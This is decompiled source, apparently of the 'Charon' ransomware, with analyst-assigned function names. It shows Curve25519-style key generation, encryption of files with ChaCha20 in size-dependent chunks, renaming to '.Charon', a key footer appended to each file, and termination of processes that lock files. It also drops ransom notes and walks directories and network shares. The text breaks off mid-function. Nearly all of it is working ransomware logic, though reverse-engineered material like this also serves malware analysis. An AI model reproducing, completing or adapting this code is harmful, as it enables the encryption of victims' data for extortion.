  sub_7FF6E55A5AA0((__int64)a5, (__int64)a6);
  sub_7FF6E55A5B30((__int64)a6, (__int64)v17);
  sub_7FF6E55B7830((__int64)v11, (__int64)a7, 0x50u);
  sub_7FF6E55A5AA0((__int64)a7, (__int64)a8);
  sub_7FF6E55A5B30((__int64)a8, (__int64)v11);
  sub_7FF6E55A5BF0(v12, a7, a6);
  sub_7FF6E55A5BF0(v10, a5, a8);
  sub_7FF6E55A6E10(v12);
  sub_7FF6E55A74E0(v12);
  sub_7FF6E55A6E10(v10);
  sub_7FF6E55A74E0(v10);
  sub_7FF6E55B7830((__int64)v11, (__int64)v12, 0x50u);
  sub_7FF6E55A5AA0((__int64)v12, (__int64)v10);
  sub_7FF6E55A5B30((__int64)v10, (__int64)v11);
  sub_7FF6E55A8280((__int64)v19, (int *)v12);
  sub_7FF6E55A8280((__int64)v18, (int *)v10);
  sub_7FF6E55A5BF0(v10, v18, a9);
  sub_7FF6E55A6E10(v10);
  sub_7FF6E55A74E0(v10);
  sub_7FF6E55B7830(a3, (__int64)v19, 0x50u);
  sub_7FF6E55B7830(a4, (__int64)v10, 0x50u);
  sub_7FF6E55A8280((__int64)v16, a5);
  sub_7FF6E55A8280((__int64)v15, a6);
  sub_7FF6E55A5BF0(a1, v16, v15);
  sub_7FF6E55A6E10(a1);
  sub_7FF6E55A74E0(a1);
  sub_7FF6E55A5B30((__int64)v15, (__int64)v16);
  fn_memset((__int64)v14, 0, 0x48u);
  sub_7FF6E55A5B90((__int64)v13, (__int64)v15, 121665);
  sub_7FF6E55A74E0(v13);
  sub_7FF6E55A5AA0((__int64)v13, (__int64)v16);
  sub_7FF6E55A5BF0(a2, v15, (int *)v13);
  sub_7FF6E55A6E10(a2);
  return sub_7FF6E55A74E0(a2);
}

//----- (00007FF6E55A9860) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55A9860(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  unsigned int i; // [rsp+0h] [rbp-18h]
  int v5; // [rsp+4h] [rbp-14h]

  result = -a3;
  for ( i = 0; i < 0xA; ++i )
  {
    v5 = (*(_DWORD *)(a2 + 8LL * i) ^ *(_DWORD *)(a1 + 8LL * i)) & -(int)a3;
    *(_QWORD *)(a1 + 8LL * i) = v5 ^ *(_DWORD *)(a1 + 8LL * i);
    *(_QWORD *)(a2 + 8LL * i) = v5 ^ *(_DWORD *)(a2 + 8LL * i);
    result = i + 1;
  }
  return result;
}

//----- (00007FF6E55A9910) ----------------------------------------------------
unsigned __int64 __fastcall sub_7FF6E55A9910(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned __int8 v5; // [rsp+50h] [rbp-568h]
  int i; // [rsp+54h] [rbp-564h]
  unsigned int j; // [rsp+58h] [rbp-560h]
  unsigned int k; // [rsp+5Ch] [rbp-55Ch]
  __int64 *v9; // [rsp+60h] [rbp-558h]
  __int64 *v10; // [rsp+60h] [rbp-558h]
  int *v11; // [rsp+60h] [rbp-558h]
  int *v12; // [rsp+60h] [rbp-558h]
  int *v13; // [rsp+68h] [rbp-550h]
  int *v14; // [rsp+70h] [rbp-548h]
  int *v15; // [rsp+78h] [rbp-540h]
  __int64 v16; // [rsp+80h] [rbp-538h]
  __int64 *v17; // [rsp+88h] [rbp-530h]
  __int64 *v18; // [rsp+90h] [rbp-528h]
  int *v19; // [rsp+98h] [rbp-520h]
  int *v20; // [rsp+A0h] [rbp-518h]
  int *v21; // [rsp+A8h] [rbp-510h]
  _QWORD v22[20]; // [rsp+B0h] [rbp-508h] BYREF
  _QWORD v23[20]; // [rsp+150h] [rbp-468h] BYREF
  _QWORD v24[20]; // [rsp+1F0h] [rbp-3C8h] BYREF
  _QWORD v25[20]; // [rsp+290h] [rbp-328h] BYREF
  _QWORD v26[20]; // [rsp+330h] [rbp-288h] BYREF
  _QWORD v27[20]; // [rsp+3D0h] [rbp-1E8h] BYREF
  _QWORD v28[20]; // [rsp+470h] [rbp-148h] BYREF
  _QWORD v29[21]; // [rsp+510h] [rbp-A8h] BYREF

  v13 = (int *)v26;
  v20 = (int *)v22;
  v14 = (int *)v23;
  v15 = (int *)v27;
  v19 = (int *)v28;
  v21 = (int *)v24;
  v17 = v29;
  v18 = v25;
  for ( i = 0; i < 19; ++i )
  {
    v26[i] = 0;
    v22[i] = 0;
    v23[i] = 0;
    v27[i] = 0;
    v28[i] = 0;
    v24[i] = 0;
    v29[i] = 0;
    v25[i] = 0;
  }
  v22[0] = 1;
  v23[0] = 1;
  v24[0] = 1;
  v25[0] = 1;
  sub_7FF6E55B7830((__int64)v26, (__int64)a4, 0x50u);
  for ( j = 0; j < 0x20; ++j )
  {
    v5 = *(_BYTE *)(a3 + 31 - j);
    for ( k = 0; k < 8; ++k )
    {
      v16 = (int)v5 >> 7;
      sub_7FF6E55A9860((__int64)v14, (__int64)v13, v16);
      sub_7FF6E55A9860((__int64)v15, (__int64)v20, v16);
      sub_7FF6E55A9570(v17, v18, (__int64)v19, (__int64)v21, v14, v15, v13, v20, a4);
      sub_7FF6E55A9860((__int64)v17, (__int64)v19, v16);
      sub_7FF6E55A9860((__int64)v18, (__int64)v21, v16);
      v9 = (__int64 *)v14;
      v14 = (int *)v17;
      v17 = v9;
      v10 = (__int64 *)v15;
      v15 = (int *)v18;
      v18 = v10;
      v11 = v13;
      v13 = v19;
      v19 = v11;
      v12 = v20;
      v20 = v21;
      v21 = v12;
      v5 *= 2;
    }
  }
  sub_7FF6E55B7830(a1, (__int64)v14, 0x50u);
  return sub_7FF6E55B7830(a2, (__int64)v15, 0x50u);
}

//----- (00007FF6E55A9CE0) ----------------------------------------------------
unsigned __int64 __fastcall sub_7FF6E55A9CE0(__int64 a1, int *a2)
{
  int i; // [rsp+20h] [rbp-338h]
  int j; // [rsp+20h] [rbp-338h]
  int k; // [rsp+20h] [rbp-338h]
  int m; // [rsp+20h] [rbp-338h]
  int n; // [rsp+20h] [rbp-338h]
  int ii; // [rsp+20h] [rbp-338h]
  int v9[20]; // [rsp+30h] [rbp-328h] BYREF
  int v10[20]; // [rsp+80h] [rbp-2D8h] BYREF
  int v11[20]; // [rsp+D0h] [rbp-288h] BYREF
  int v12[20]; // [rsp+120h] [rbp-238h] BYREF
  int v13[20]; // [rsp+170h] [rbp-1E8h] BYREF
  int v14[20]; // [rsp+1C0h] [rbp-198h] BYREF
  int v15[20]; // [rsp+210h] [rbp-148h] BYREF
  int v16[20]; // [rsp+260h] [rbp-F8h] BYREF
  int v17[20]; // [rsp+2B0h] [rbp-A8h] BYREF
  int v18[22]; // [rsp+300h] [rbp-58h] BYREF

  sub_7FF6E55A8280((__int64)v13, a2);
  sub_7FF6E55A8280((__int64)v10, v13);
  sub_7FF6E55A8280((__int64)v9, v10);
  sub_7FF6E55A7750((__int64)v14, v9, a2);
  sub_7FF6E55A7750((__int64)v18, v14, v13);
  sub_7FF6E55A8280((__int64)v9, v18);
  sub_7FF6E55A7750((__int64)v15, v9, v14);
  sub_7FF6E55A8280((__int64)v9, v15);
  sub_7FF6E55A8280((__int64)v10, v9);
  sub_7FF6E55A8280((__int64)v9, v10);
  sub_7FF6E55A8280((__int64)v10, v9);
  sub_7FF6E55A8280((__int64)v9, v10);
  sub_7FF6E55A7750((__int64)v11, v9, v15);
  sub_7FF6E55A8280((__int64)v9, v11);
  sub_7FF6E55A8280((__int64)v10, v9);
  for ( i = 2; i < 10; i += 2 )
  {
    sub_7FF6E55A8280((__int64)v9, v10);
    sub_7FF6E55A8280((__int64)v10, v9);
  }
  sub_7FF6E55A7750((__int64)v16, v10, v11);
  sub_7FF6E55A8280((__int64)v9, v16);
  sub_7FF6E55A8280((__int64)v10, v9);
  for ( j = 2; j < 20; j += 2 )
  {
    sub_7FF6E55A8280((__int64)v9, v10);
    sub_7FF6E55A8280((__int64)v10, v9);
  }
  sub_7FF6E55A7750((__int64)v9, v10, v16);
  sub_7FF6E55A8280((__int64)v10, v9);
  sub_7FF6E55A8280((__int64)v9, v10);
  for ( k = 2; k < 10; k += 2 )
  {
    sub_7FF6E55A8280((__int64)v10, v9);
    sub_7FF6E55A8280((__int64)v9, v10);
  }
  sub_7FF6E55A7750((__int64)v12, v9, v11);
  sub_7FF6E55A8280((__int64)v9, v12);
  sub_7FF6E55A8280((__int64)v10, v9);
  for ( m = 2; m < 50; m += 2 )
  {
    sub_7FF6E55A8280((__int64)v9, v10);
    sub_7FF6E55A8280((__int64)v10, v9);
  }
  sub_7FF6E55A7750((__int64)v17, v10, v12);
  sub_7FF6E55A8280((__int64)v10, v17);
  sub_7FF6E55A8280((__int64)v9, v10);
  for ( n = 2; n < 100; n += 2 )
  {
    sub_7FF6E55A8280((__int64)v10, v9);
    sub_7FF6E55A8280((__int64)v9, v10);
  }
  sub_7FF6E55A7750((__int64)v10, v9, v17);
  sub_7FF6E55A8280((__int64)v9, v10);
  sub_7FF6E55A8280((__int64)v10, v9);
  for ( ii = 2; ii < 50; ii += 2 )
  {
    sub_7FF6E55A8280((__int64)v9, v10);
    sub_7FF6E55A8280((__int64)v10, v9);
  }
  sub_7FF6E55A7750((__int64)v9, v10, v12);
  sub_7FF6E55A8280((__int64)v10, v9);
  sub_7FF6E55A8280((__int64)v9, v10);
  sub_7FF6E55A8280((__int64)v10, v9);
  sub_7FF6E55A8280((__int64)v9, v10);
  sub_7FF6E55A8280((__int64)v10, v9);
  return sub_7FF6E55A7750(a1, v10, v18);
}

//----- (00007FF6E55AA1A0) ----------------------------------------------------
int __fastcall fn_main_logic_encrypt(const WCHAR *a1)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  lpFileName = a1;
  v73[0] = 9;
  memset(&v73[1], 0, 0x1Fu);
  v29 = 1;
  v71 = 'norahCh';                              // infection "hCharon is enter to the urworld!"
  qmemcpy(v72, "is enter to the urworld!", sizeof(v72));
  SetFileAttributesW(a1, 0x80u);
  v1 = lstrlenW(lpFileName);
  v2 = (WCHAR *)fn_call_HeapAlloc(2LL * (v1 + 8));
  lpString1 = v2;
  if ( v2 )
  {
    lstrcpyW(lpString1, lpFileName);
    lstrcatW(lpString1, L".Charon");
    LODWORD(v2) = MoveFileExW(lpFileName, lpString1, 9u);
    if ( (_DWORD)v2 )
    {
      while ( 1 )
      {
        hFile = CreateFileW(lpString1, 0xC0000000, 0, 0, 3u, 0x8000000u, 0);
        LODWORD(v2) = fn_call_HeapFree(lpString1);
        if ( hFile != (HANDLE)-1LL )
        {
          GetFileSizeEx(hFile, &FileSize);
          lpBuffer = fn_call_HeapAlloc(0x100000);
          if ( lpBuffer )
          {
            CryptGenRandom(hProv, 0x20u, pbBuffer);
            pbBuffer[0] &= 0xF8u;
            v67 &= ~0x80u;
            v67 |= 0x40u;
            sub_7FF6E55A5970((__int64)Buffer, (__int64)pbBuffer, (__int64)v73);
            sub_7FF6E55A5970((__int64)v65, (__int64)pbBuffer, (__int64)&unk_7FF6E55BBA50);
            sub_7FF6E55B4750(v65, 32, v74);
            sub_7FF6E55B35D0((__int64)v77, (__int64)v74, 0x100u, 256);
            sub_7FF6E55B3690((__int64)v77, (__int64)v75);
            v70 = sub_7FF6E55B3F80(v74, 64);
            fn_memset((__int64)v78, 0, 0x40u);
            fn_memset((__int64)v74, 0, 0x40u);
            fn_memset((__int64)v65, 0, 0x40u);
            liDistanceToMove.QuadPart = 0;
            SetFilePointerEx(hFile, 0, 0, 0);
            if ( FileSize.QuadPart <= 0x1400000 )
            {
              if ( FileSize.QuadPart <= 0x500000 )
              {
                if ( FileSize.QuadPart <= 0x10000 )
                {
                  if ( FileSize.QuadPart > 0 )
                  {
                    ReadFile(hFile, lpBuffer, FileSize.LowPart, &NumberOfBytesRead, 0);
                    fn_ChaCha20_Encrypt(0, (__int64)v77, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);
                    SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                    WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);
                  }
                }
                else
                {
                  v64[0] = 0;
                  v64[1] = FileSize.QuadPart / 2;
                  v64[2] = FileSize.QuadPart - FileSize.QuadPart / 4;
                  *(_QWORD *)v20 = FileSize.QuadPart / 6;
                  if ( FileSize.QuadPart / 6 < 1024 )
                    *(_QWORD *)v20 = 1024;
                  if ( *(__int64 *)v20 > 0x100000 )
                    *(_QWORD *)v20 = 0x100000;
                  for ( i = 0; i < 3; ++i )
                  {
                    if ( *(_QWORD *)v20 + v64[i] <= FileSize.QuadPart )
                    {
                      liDistanceToMove = (LARGE_INTEGER)v64[i];
                      SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                      ReadFile(hFile, lpBuffer, v20[0], &NumberOfBytesRead, 0);
                      fn_ChaCha20_Encrypt(0, (__int64)v77, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);
                      SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                      WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);
                    }
                  }
                }
              }
              else
              {
                v45 = FileSize.QuadPart / 5;
                if ( FileSize.QuadPart / 5 <= 0x100000 )
                  v52 = v45;
                else
                  v52 = 0x100000;
                *(_QWORD *)nNumberOfBytesToRead = v52;
                for ( j = 0; j < 5; ++j )
                {
                  liDistanceToMove.QuadPart = v45 * j;
                  SetFilePointerEx(hFile, (LARGE_INTEGER)(v45 * j), 0, 0);
                  ReadFile(hFile, lpBuffer, nNumberOfBytesToRead[0], &NumberOfBytesRead, 0);
                  fn_ChaCha20_Encrypt(0, (__int64)v77, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);
                  SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                  WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);
                }
              }
            }
            else
            {
              v68[0] = 0;
              v68[1] = FileSize.QuadPart / 8;
              v68[2] = FileSize.QuadPart / 4;
              v68[3] = FileSize.QuadPart / 2;
              v68[4] = 3 * FileSize.QuadPart / 4;
              v68[5] = 7 * FileSize.QuadPart / 8;
              v68[6] = FileSize.QuadPart - 0x100000;
              for ( k = 0; k < 7; ++k )
              {
                if ( (__int64)v68[k] >= 0 && v68[k] < FileSize.QuadPart - 0x100000 )
                {
                  liDistanceToMove = (LARGE_INTEGER)v68[k];
                  SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                  ReadFile(hFile, lpBuffer, 0x100000u, &NumberOfBytesRead, 0);
                  fn_ChaCha20_Encrypt(0, (__int64)v77, lpBuffer, (int *)lpBuffer, NumberOfBytesRead);// encrypt file data
                  SetFilePointerEx(hFile, liDistanceToMove, 0, 0);
                  WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, 0);
                }
              }
            }
            fn_memset((__int64)v77, 0, 0x10CCu);
            liDistanceToMove.QuadPart = 0;
            SetFilePointerEx(hFile, 0, 0, 2u);
            WriteFile(hFile, Buffer, 0x48u, &NumberOfBytesWritten, 0);// append 72-byte key footer
            fn_call_HeapFree(lpBuffer);
          }
          LODWORD(v2) = CloseHandle(hFile);
          return (int)v2;
        }
        if ( !v29 )
          break;
        fn_memset((__int64)strSessionKey, 0, 0x42u);
        v22 = RmStartSession(&pSessionHandle, 0, strSessionKey) == 0;
        LODWORD(v2) = v22;
        v12 = v22;
        if ( !v22 )
        {
          if ( dword_7FF6E55BBB40 )
          {
            v37 = lstrlenW(lpFileName);
            v60 = lpFileName;
            v30 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v37, 0, 0, 0, 0);
            v49 = (LPSTR)fn_call_HeapAlloc(v30);
            v38 = lstrlenW(lpFileName);
            v61 = lpFileName;
            WideCharToMultiByte(0xFDE9u, 0, lpFileName, v38, v49, v30, 0, 0);
            sub_7FF6E55A5740("Can't RmStartSession", v49, v12);
            LODWORD(v2) = fn_call_HeapFree(v49);
          }
          return (int)v2;
        }
        v23 = RmRegisterResources(pSessionHandle, 1u, &lpFileName, 0, 0, 0, 0) == 0;
        v12 = v23;
        if ( v23 )
        {
          pnProcInfo = 10;
          v24 = RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, rgAffectedApps, &dwRebootReasons) == 0;
          v12 = v24;
          if ( v24 )
          {
            for ( m = 0; m < pnProcInfo; ++m )
            {
              if ( rgAffectedApps[m].ApplicationType != RmExplorer
                && rgAffectedApps[m].ApplicationType != RmCritical
                && GetCurrentProcessId() != rgAffectedApps[m].Process.dwProcessId )
              {
                hProcess = OpenProcess(0x100001u, 0, rgAffectedApps[m].Process.dwProcessId);
                if ( hProcess == (HANDLE)-1LL )
                {
                  if ( dword_7FF6E55BBB40 )
                  {
                    v3 = lstrlenW(rgAffectedApps[m].strAppName);
                    cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, rgAffectedApps[m].strAppName, v3, 0, 0, 0, 0);
                    lpMultiByteStr = (LPSTR)fn_call_HeapAlloc(cbMultiByte);
                    v4 = lstrlenW(rgAffectedApps[m].strAppName);
                    WideCharToMultiByte(0xFDE9u, 0, rgAffectedApps[m].strAppName, v4, lpMultiByteStr, cbMultiByte, 0, 0);
                    LastError = GetLastError();
                    sub_7FF6E55A5740("Can't OpenProcess", lpMultiByteStr, LastError);
                    fn_call_HeapFree(lpMultiByteStr);
                  }
                }
                else
                {
                  TerminateProcess(hProcess, 0);
                  WaitForSingleObject(hProcess, 0x1388u);
                  CloseHandle(hProcess);
                }
              }
            }
          }
          else if ( dword_7FF6E55BBB40 )
          {
            cchWideChar = lstrlenW(lpFileName);
            lpWideCharStr = lpFileName;
            v27 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, cchWideChar, 0, 0, 0, 0);
            v47 = (LPSTR)fn_call_HeapAlloc(v27);
            v44 = lstrlenW(lpFileName);
            v57 = lpFileName;
            WideCharToMultiByte(0xFDE9u, 0, lpFileName, v44, v47, v27, 0, 0);
            sub_7FF6E55A5740("Can't RmGetList", v47, v12);
            fn_call_HeapFree(v47);
          }
        }
        else if ( dword_7FF6E55BBB40 )
        {
          v35 = lstrlenW(lpFileName);
          v58 = lpFileName;
          v28 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v35, 0, 0, 0, 0);
          v48 = (LPSTR)fn_call_HeapAlloc(v28);
          v36 = lstrlenW(lpFileName);
          v59 = lpFileName;
          WideCharToMultiByte(0xFDE9u, 0, lpFileName, v36, v48, v28, 0, 0);
          sub_7FF6E55A5740("Can't RmRegisterResources", v48, v12);
          fn_call_HeapFree(v48);
        }
        RmEndSession(pSessionHandle);
        v29 = 0;
      }
      if ( dword_7FF6E55BBB40 )
      {
        v39 = lstrlenW(lpFileName);
        v62 = lpFileName;
        v31 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v39, 0, 0, 0, 0);
        v50 = (LPSTR)fn_call_HeapAlloc(v31);
        v42 = lstrlenW(lpFileName);
        v63 = lpFileName;
        WideCharToMultiByte(0xFDE9u, 0, lpFileName, v42, v50, v31, 0, 0);
        v6 = GetLastError();
        sub_7FF6E55A5740("Can't open file after killHolder", v50, v6);
        LODWORD(v2) = fn_call_HeapFree(v50);
      }
    }
    else if ( dword_7FF6E55BBB40 )
    {
      v40 = lstrlenW(lpFileName);
      v32 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v40, 0, 0, 0, 0);
      v51 = (LPSTR)fn_call_HeapAlloc(v32);
      v41 = lstrlenW(lpFileName);
      WideCharToMultiByte(0xFDE9u, 0, lpFileName, v41, v51, v32, 0, 0);
      v7 = GetLastError();
      sub_7FF6E55A5740("Can't MoveFileExW", v51, v7);
      LODWORD(v2) = fn_call_HeapFree(v51);
    }
  }
  return (int)v2;
}
// 7FF6E55B4750: using guessed type __int64 __fastcall sub_7FF6E55B4750(_QWORD, _QWORD, _QWORD);
// 7FF6E55BBB40: using guessed type int dword_7FF6E55BBB40;

//----- (00007FF6E55AB3C0) ----------------------------------------------------
int __fastcall fn_logic_filter_file(const WCHAR *a1)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  v1 = (WCHAR *)fn_call_HeapAlloc(0x10000);
  lpString1 = v1;
  if ( v1 )
  {
    lstrcpyW(v1, a1);
    lstrcatW(lpString1, L"\\How To Restore Your Files.txt");
    hFile = CreateFileW(lpString1, 0x40000000u, 1u, 0, 1u, 0, 0);
    if ( hFile != (HANDLE)-1LL )
    {
      v2 = lstrlenA(Buffer);
      WriteFile(hFile, Buffer, v2, &NumberOfBytesWritten, 0);
      CloseHandle(hFile);
    }
    lstrcpyW(lpString1, a1);
    lstrcatW(lpString1, L"\\*");
    hFindFile = FindFirstFileW(lpString1, &FindFileData);
    if ( hFindFile == (HANDLE)-1LL )
    {
      if ( dword_7FF6E55BBB40 )
      {
        v3 = lstrlenW(a1);
        cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, a1, v3, 0, 0, 0, 0);
        lpMultiByteStr = (LPSTR)fn_call_HeapAlloc(cbMultiByte);
        v4 = lstrlenW(a1);
        WideCharToMultiByte(0xFDE9u, 0, a1, v4, lpMultiByteStr, cbMultiByte, 0, 0);
        LastError = GetLastError();
        sub_7FF6E55A5740("Can't FindFirstFileW", lpMultiByteStr, LastError);
        fn_call_HeapFree(lpMultiByteStr);
      }
    }
    else
    {
      do
      {
        for ( i = 0; i < 0x22uLL; ++i )
        {
          if ( !lstrcmpiW(FindFileData.cFileName, gn_folder[i]) )
            goto LABEL_25;
        }
        lstrcpyW(lpString1, a1);
        lstrcatW(lpString1, &word_7FF6E55A1D28);
        lstrcatW(lpString1, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) == 0
          && lstrcmpW(FindFileData.cFileName, L"How To Restore Your Files.txt") )
        {
          for ( j = lstrlenW(FindFileData.cFileName) - 1; ; --j )
          {
            if ( j < 0 )
              goto LABEL_20;
            if ( FindFileData.cFileName[j] == 46 )
              break;
          }
          if ( lstrcmpiW(&FindFileData.cFileName[j], L".exe")
            && lstrcmpiW(&FindFileData.cFileName[j], L".dll")
            && lstrcmpiW(&FindFileData.cFileName[j], L".Charon") )
          {
LABEL_20:
            while ( !(unsigned int)fn_ring_queue_enqueue_wstr((__int64)&unk_7FF6E55BBAA0, lpString1, 0) )
            {
              v11 = 0;
              while ( 1 )
              {
                v13 = (WCHAR *)fn_ring_queue_dequeue_wstr((__int64)&unk_7FF6E55BBAA0, 0, &v11);
                if ( !v13 )
                  break;
                fn_main_logic_encrypt(v13);
                fn_call_HeapFree(v13);
              }
            }
          }
        }
LABEL_25:
        ;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
    }
    LODWORD(v1) = fn_call_HeapFree(lpString1);
  }
  return (int)v1;
}
// 7FF6E55BB940: using guessed type LPCWSTR gn_folder[1];
// 7FF6E55BBB40: using guessed type int dword_7FF6E55BBB40;

//----- (00007FF6E55AB7B0) ----------------------------------------------------
int __fastcall fn_walk_directory_recursive(const WCHAR *a1)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  while ( !(unsigned int)fn_ring_queue_enqueue_wstr((__int64)&unk_7FF6E55BBAF0, a1, 0) )
  {
    while ( 1 )
    {
      v9 = (WCHAR *)fn_ring_queue_dequeue_wstr((__int64)&unk_7FF6E55BBAA0, 0, v12);
      if ( !v9 )
        break;
      fn_main_logic_encrypt(v9);
      fn_call_HeapFree(v9);
    }
  }
  v1 = (WCHAR *)fn_call_HeapAlloc(0x10000);
  lpString1 = v1;
  if ( v1 )
  {
    lstrcpyW(v1, a1);
    lstrcatW(lpString1, L"\\*");
    hFindFile = FindFirstFileW(lpString1, &FindFileData);
    if ( hFindFile == (HANDLE)-1LL )
    {
      if ( dword_7FF6E55BBB40 )
      {
        v2 = lstrlenW(a1);
        cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, a1, v2, 0, 0, 0, 0);
        lpMultiByteStr = (CHAR *)fn_call_HeapAlloc(cbMultiByte);
        v3 = lstrlenW(a1);
        WideCharToMultiByte(0xFDE9u, 0, a1, v3, lpMultiByteStr, cbMultiByte, 0, 0);
        LastError = GetLastError();
        sub_7FF6E55A5740("Can't FindFirstFileW", lpMultiByteStr, LastError);
        fn_call_HeapFree(lpMultiByteStr);
      }
    }
    else
    {
      do
      {
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          for ( i = 0; i < 0x22uLL; ++i )
          {
            if ( !lstrcmpiW(FindFileData.cFileName, gn_folder[i]) )
              goto LABEL_13;
          }
          lstrcpyW(lpString1, a1);
          lstrcatW(lpString1, L"\\");
          lstrcatW(lpString1, FindFileData.cFileName);
          fn_walk_directory_recursive(lpString1);
        }
LABEL_13:
        ;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
    }
    LODWORD(v1) = fn_call_HeapFree(lpString1);
  }
  return (int)v1;
}
// 7FF6E55BB940: using guessed type LPCWSTR qword_7FF6E55BB940[1];
// 7FF6E55BBB40: using guessed type int dword_7FF6E55BBB40;

//----- (00007FF6E55ABA30) ----------------------------------------------------
void __fastcall __noreturn StartAddress_EncryptionThreadProc(LPVOID lpThreadParameter)
{
  int v1; // [rsp+20h] [rbp-18h] BYREF
  WCHAR *v2; // [rsp+28h] [rbp-10h]

  v1 = 0;
  v2 = 0;
  if ( lpThreadParameter )
  {
    while ( 1 )
    {
      v2 = (WCHAR *)fn_ring_queue_dequeue_wstr((__int64)&unk_7FF6E55BBAF0, 0, &v1);
      if ( v2 )
      {
        fn_logic_filter_file(v2);
        fn_call_HeapFree(v2);
      }
      else if ( v1 != -1 )
      {
        goto LABEL_11;
      }
      while ( 1 )
      {
        v2 = (WCHAR *)fn_ring_queue_dequeue_wstr((__int64)&unk_7FF6E55BBAA0, 0, &v1);
        if ( !v2 )
          break;
        fn_main_logic_encrypt(v2);
        fn_call_HeapFree(v2);
      }
    }
  }
  while ( 1 )
  {
    v2 = (WCHAR *)fn_ring_queue_dequeue_wstr((__int64)&unk_7FF6E55BBAA0, 1, &v1);
    if ( !v2 )
      break;
    fn_main_logic_encrypt(v2);
    fn_call_HeapFree(v2);
  }
LABEL_11:
  ExitThread(0);
}

//----- (00007FF6E55ABB30) ----------------------------------------------------
DWORD __fastcall fn_Enumerate_Network_Resoures(struct _NETRESOURCEW *a1)
{
  DWORD result; // eax
  DWORD i; // [rsp+30h] [rbp-28h]
  DWORD BufferSize; // [rsp+34h] [rbp-24h] BYREF
  DWORD cCount; // [rsp+38h] [rbp-20h] BYREF
  HANDLE hEnum; // [rsp+40h] [rbp-18h] BYREF
  LPNETRESOURCEW lpNetResource; // [rsp+60h] [rbp+8h]

  cCount = -1;
  BufferSize = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, a1, &hEnum);
  if ( !result )
  {
    lpNetResource = (LPNETRESOURCEW)fn_call_HeapAlloc(BufferSize);
    if ( lpNetResource )
    {
      while ( !WNetEnumResourceW(hEnum, &cCount, lpNetResource, &BufferSize) )
      {
        for ( i = 0; i < cCount; ++i )
        {
          if ( (lpNetResource[i].dwUsage & 2) == 2 )
            fn_Enumerate_Network_Resoures(&lpNetResource[i]);
          else
            fn_walk_directory_recursive(lpNetResource[i].lpRemoteName);
        }
      }
      fn_call_HeapFree(lpNetResource);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}

//----- (00007FF6E55ABC40) ----------------------------------------------------
DWORD __fastcall fn_handle_option_shares(WCHAR *a1)
{
  DWORD result; // eax
  DWORD i; // [rsp+40h] [rbp-108h]
  DWORD v3; // [rsp+44h] [rbp-104h]
  LPBYTE v4; // [rsp+48h] [rbp-100h]
  DWORD entriesread; // [rsp+50h] [rbp-F8h] BYREF
  DWORD resume_handle; // [rsp+54h] [rbp-F4h] BYREF
  DWORD totalentries; // [rsp+58h] [rbp-F0h] BYREF
  LPBYTE bufptr; // [rsp+60h] [rbp-E8h] BYREF
  WCHAR String1[108]; // [rsp+70h] [rbp-D8h] BYREF

  entriesread = 0;
  totalentries = 0;
  resume_handle = 0;
  do
  {
    result = NetShareEnum(a1, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, &resume_handle);
    v3 = result;
    if ( !result || result == 234 )
    {
      v4 = bufptr;
      for ( i = 1; i <= entriesread; ++i )
      {
        if ( (!*((_DWORD *)v4 + 2) || *((_DWORD *)v4 + 2) == 0x80000000) && lstrlenW(*(LPCWSTR *)v4) > 2 )
        {
          if ( lstrcmpW(*(LPCWSTR *)v4, L"ADMIN$") )
          {
            lstrcpyW(String1, L"\\\\");
            lstrcatW(String1, a1);
            lstrcatW(String1, L"\\");
            lstrcatW(String1, *(LPCWSTR *)v4);
            fn_walk_directory_recursive(String1);
          }
        }
        v4 += 24;
      }
      result = NetApiBufferFree(bufptr);
    }
  }
  while ( v3 == 234 );
  return result;
}

//----- (00007FF6E55ABDC0) ----------------------------------------------------
int __fastcall fn_scan_drive_letter_dispatch(WCHAR a1)
{
  WCHAR *v1; // rax
  UINT DriveTypeW; // [rsp+20h] [rbp-28h]
  DWORD nLength; // [rsp+24h] [rbp-24h] BYREF
  LPWSTR lpString1; // [rsp+28h] [rbp-20h]
  LPWSTR lpRemoteName; // [rsp+30h] [rbp-18h]

  v1 = (WCHAR *)fn_call_HeapAlloc(14);
  lpString1 = v1;
  if ( v1 )
  {
    lstrcpyW(lpString1, L"\\\\?\\");
    lstrcpyW(lpString1 + 5, L":");
    lpString1[4] = a1;
    DriveTypeW = GetDriveTypeW(lpString1);
    if ( DriveTypeW && DriveTypeW != 5 )
    {
      if ( DriveTypeW == 4 )
      {
        nLength = 260;
        lpRemoteName = (LPWSTR)fn_call_HeapAlloc(520);
        if ( lpRemoteName )
        {
